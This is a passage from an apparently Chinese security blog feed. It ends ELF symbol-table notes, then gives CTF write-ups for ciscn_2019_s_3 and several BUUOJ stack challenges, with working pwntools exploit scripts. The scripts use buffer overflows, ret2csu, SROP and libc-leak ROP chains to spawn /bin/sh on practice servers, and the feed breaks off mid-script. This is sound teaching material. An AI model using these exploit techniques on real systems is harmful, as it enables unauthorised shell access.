alt="image-20210210204233887"></p><p><strong>符号类型和绑定信息（st_info）</strong></p><p>成员低4为是符号的类型，高28为表示符号绑定信息</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204418983.png" alt="image-20210210204418983"></p><p><strong>符号所在段（st_shndx）</strong></p><p>如果符号定义在本目标文件中，这个成员表示符号所在的段在段表的下标；但如果符号不是定义在本目标文件中，或者对于有些特殊符号，sh_shndx的值会有些特殊</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204647740.png" alt="image-20210210204647740"></p><p><strong>符号值</strong></p><p>上文说了，符号值就是每一个符号的变量地址</p><p>具体来说，有以下几种类型</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204943554.png" alt="image-20210210204943554"></p><p>看一下我们的符号表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s a.o</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205129282.png" alt="image-20210210205129282"></p><blockquote><p>第一列Num就是数组下标，从零开始</p><p>第二列vaule就是符号值，<code>st_value</code></p><p>第三列Size为符号大小<code>st_size</code></p><p>第四列和第五列为符号类型和绑定信息</p><p>第七列就是Ndx即<code>st_shndx</code>表示符号所在的段。</p><p>最后一列就是符号名称</p></blockquote><p>具体解释如下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205708052.png" alt="image-20210210205708052"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205716690.png" alt="image-20210210205716690"></p><h3 id="5-2-特殊符号"><a href="#5-2-特殊符号" class="headerlink" title="5.2 特殊符号"></a>5.2 特殊符号</h3><p>特殊符号就是你无须定义它们，但你可以声明并使用他们。</p><p>并且只有用ld链接器生产最终可执行文件这些符号才会存在，链接器会在将程序最终链接成可执行文件是将其解析成正确的值。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210211122171.png" alt="image-20210210211122171"></p><p>后面的签名、强弱就跳过了，需要时继续研究。</p><h1 id="0x03-静态链接"><a href="#0x03-静态链接" class="headerlink" title="0x03 静态链接"></a>0x03 静态链接</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-编译和链接&quot;&gt;&lt;a href=&quot;#0x01-编译和链接&quot; class=&quot;headerlink&quot; title=&quot;0x01 编译和链接&quot;&gt;&lt;/a&gt;0x01 编译和链接&lt;/h1&gt;&lt;h2 id=&quot;1-被隐藏了的过程&quot;&gt;&lt;a href=&quot;#1-被隐藏了的过程&quot; c</summary>
      
    
    
    
    
    <category term="读书笔记" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>一道栈题</title>
    <link href="https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/"/>
    <id>https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/</id>
    <published>2021-02-14T08:54:00.000Z</published>
    <updated>2021-02-15T07:15:54.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a><strong>ciscn_2019_s_3</strong></h1><p>国赛的一道栈题</p><p>main函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214151957313.png" alt="image-20210214151957313"></p><p>vuln函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152021865.png" alt="image-20210214152021865"></p><p>gadgets函数</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152042139.png" alt="image-20210214152042139"></p><p>看一下gadgets函数</p><p>里面有0f（15）和3b（59）看一下这两个是什么</p><blockquote><p>15 sys_rt_sigreturn<br>59 sys_execve</p></blockquote><p><strong>接下来说一下syscall</strong></p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>什么时syscall</p><p>看wiki</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153005144.png" alt="image-20210214153005144"></p><p>在32位和64位中是有些不同的</p><blockquote><p>32位：</p><p>传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p><p>调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</p><p>调用方式: 使用 int 80h 中断进行系统调用</p><p>64位：</p><p>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p><p>调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</p><p>stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</p><p>调用方式: 使用 syscall 进行系统调用</p></blockquote><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>接下来继续看题解</p><p>从汇编中我们可以看到</p><p>在vuln函数中有栈溢出</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153444144.png" alt="image-20210214153444144"></p><p>同时这个题还有一个地方</p><p>就是最后时没有leave的</p><p>也就是offset是0x10，之后就是返回地址</p><hr><p>接下来看gadgets</p><p>它里面有两个调用号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax，0Fh    &#x2F;&#x2F;   0Fh  即15    而15 对应的是 sys_rt_sigreturn系统调用</span><br><span class="line">mov rax，3Bh     &#x2F;&#x2F;  3Bh  即 59    而15 对应的是  sys_execve 系统调用</span><br></pre></td></tr></table></figure><p>所以有两种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种：利用 ret2__libc_csu_init 去构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br><span class="line">第二种：直接srop 伪造 sigreturn frame 去 构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br></pre></td></tr></table></figure><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><h3 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h3><p>既然想系统调用，我们就得传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi &quot;&#x2F;bin&#x2F;sh&quot;的指针</span><br><span class="line">rsi 0</span><br><span class="line">rdx 0</span><br></pre></td></tr></table></figure><p>首先想到的肯定是gadget</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214154550271.png" alt="image-20210214154550271"></p><p>rdi rsi 都有了但问题是没有rdx</p><p>这时就可以看ida了</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214162318162.png" alt="image-20210214162318162"></p><p>看到有rdx</p><p>这样我们就可以利用gadget了，但问题是要想获得/bin/sh的指针</p><p>就需要知道栈上的地址</p><p>也不知道是什么，看网上wp，都说write中有，调试了一下确实</p><p>原因不太清楚</p><p>接下来就是写wp了</p><ol><li><p>第一步我们需要得到bin/sh的指针</p></li><li><p>接下来第二步就是ROP，这里有一个不好理解的就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>因为我们r12是指向栈上的,且rbx每次都是加一，这样其实就利用了我们的gadget</p></li><li><p>最后就是循环调用上面的call，知道系统调用</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./ciscn_2019_s_3")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28985</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln_addr=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_execv_addr=<span class="number">0x4004E2</span>   </span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x4005a3</span>  </span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr=<span class="number">0x40059A</span></span><br><span class="line">__libc_csu_init_addr=<span class="number">0x400580</span>  <span class="comment"># __libc_csu_init gadget 首地址</span></span><br><span class="line">syscall_addr=<span class="number">0x400501</span>             <span class="comment">#ida中查看</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=uu64(r(<span class="number">8</span>))<span class="number">-280</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,bin_sh_addr)</span><br><span class="line">payload2=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh_addr+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">print(hex(bin_sh_addr+<span class="number">0x50</span>))</span><br><span class="line">payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)</span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) </span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>这就是ret2__libc_csu_init()</strong></p><h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>先介绍SROP</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP也是栈溢出，但不同ROP的是。</p><p>SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放到栈中。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>signal机制</strong></p><p>当有中断或异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存上下文，再跳转到之前注册好的signal handler中进行处理</p><p>待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。</p><ol><li>一个signal frame被添加到栈，这个frame包含了寄存器的值和一些signal信息</li><li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn调用</li><li>signal handler 被调用，signal handler的行为取决于收到什么signal</li><li>signal handler执行后，如果程序没有终止，则返回地址用于执行sigreturn调用</li><li>sigreturn利用signal frame恢复所有寄存器以回到之前状态</li><li>程序继续执行</li></ol><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png" alt="image-20210214203411860"></p><blockquote><p>我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p><p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p></blockquote><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>系统在执行sigreturn系统调用的时候，不会对signal检查。</p><p>由于sigreturn会从用户栈上恢复所有寄存器的值，而用户栈是保存在用户进程地址空间中的，是用户进程可读写的。</p><p>如果攻击者控制栈，也就控制了寄存器的值。</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png" alt="image-20210214203929462"></p><p><strong>一系列函数</strong></p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png" alt="image-20210215144016291"></p><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul><p>接下来，看我们这个题</p><p>syscall sigreturn 是我们知道的</p><p>接下来解决bin/sh就可以，由第一种解法我们已经知道栈上指向/bin/sh的指针</p><p>接下来直接写就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29158</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">print(r(<span class="number">0x20</span>))</span><br><span class="line">binsh = u64(r(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,binsh)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><blockquote><p>pwntools已经集成了sigreturn</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-s-3&quot;&gt;&lt;a href=&quot;#ciscn-2019-s-3&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_s_3&quot;&gt;&lt;/a&gt;&lt;strong&gt;ciscn_2019_s_3&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;国赛的一道</summary>
      
    
    
    
    
    <category term="刷题" scheme="https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN1)---栈</title>
    <link href="https://pz1o.top/2021/01/23/BUU-PWN/"/>
    <id>https://pz1o.top/2021/01/23/BUU-PWN/</id>
    <published>2021-01-23T06:22:39.000Z</published>
    <updated>2021-02-15T12:35:48.151Z</updated>
    
    <content type="html"><![CDATA[<p>寒假开始刷题</p><h1 id="BUU（栈）"><a href="#BUU（栈）" class="headerlink" title="BUU（栈）"></a>BUU（栈）</h1><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#node3.buuoj.cn:28301</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28301</span>)</span><br><span class="line"><span class="comment">#r = process("")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28698</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn1_sctf_2016")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + <span class="string">b'A'</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>浮点数在内存中的存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">float a &#x3D; 11.28125;</span><br><span class="line">unsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class="line">printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29611</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x2c</span>) + <span class="string">"\x00\x80\x34\x41"</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26846</span>)</span><br><span class="line"><span class="comment">#r = process("./stack")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) + p64(<span class="number">0x400537</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="第六章-CTF之PWN章-ROP（64位系统调用）"><a href="#第六章-CTF之PWN章-ROP（64位系统调用）" class="headerlink" title="[第六章 CTF之PWN章]ROP（64位系统调用）"></a>[第六章 CTF之PWN章]ROP（64位系统调用）</h2><p>64位的系统调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">puts_got &#x3D; 0x601018</span><br><span class="line">puts &#x3D; 0x400430</span><br><span class="line">main &#x3D; 0x400537</span><br><span class="line">rop1 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop1 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop1 +&#x3D; p64(puts_got)</span><br><span class="line">rop1 +&#x3D; p64(puts)</span><br><span class="line">rop1 +&#x3D; p64(main)</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class="line">rop2 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop2 +&#x3D; p64(pop_rax)</span><br><span class="line">rop2 +&#x3D; p64(59)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop2 +&#x3D; p64(binsh)</span><br><span class="line">rop2 +&#x3D; p64(pop_rsi)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdx)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(syscall)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot;hello\n&quot;)</span><br><span class="line">p.sendline(rop2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,28426)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.271.so&quot;)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;rop&quot;)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">ret &#x3D; 0x400416</span><br><span class="line">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class="line">ru(&#39;hello\n&#39;)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400537)</span><br><span class="line">sl(payload)</span><br><span class="line">puts &#x3D; u64(p.recv(6).ljust(8, &#39;\x00&#39;))</span><br><span class="line">leak(&quot;puts&quot;,puts)</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sys &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line"># libc &#x3D; LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line"># libc_base &#x3D; puts - 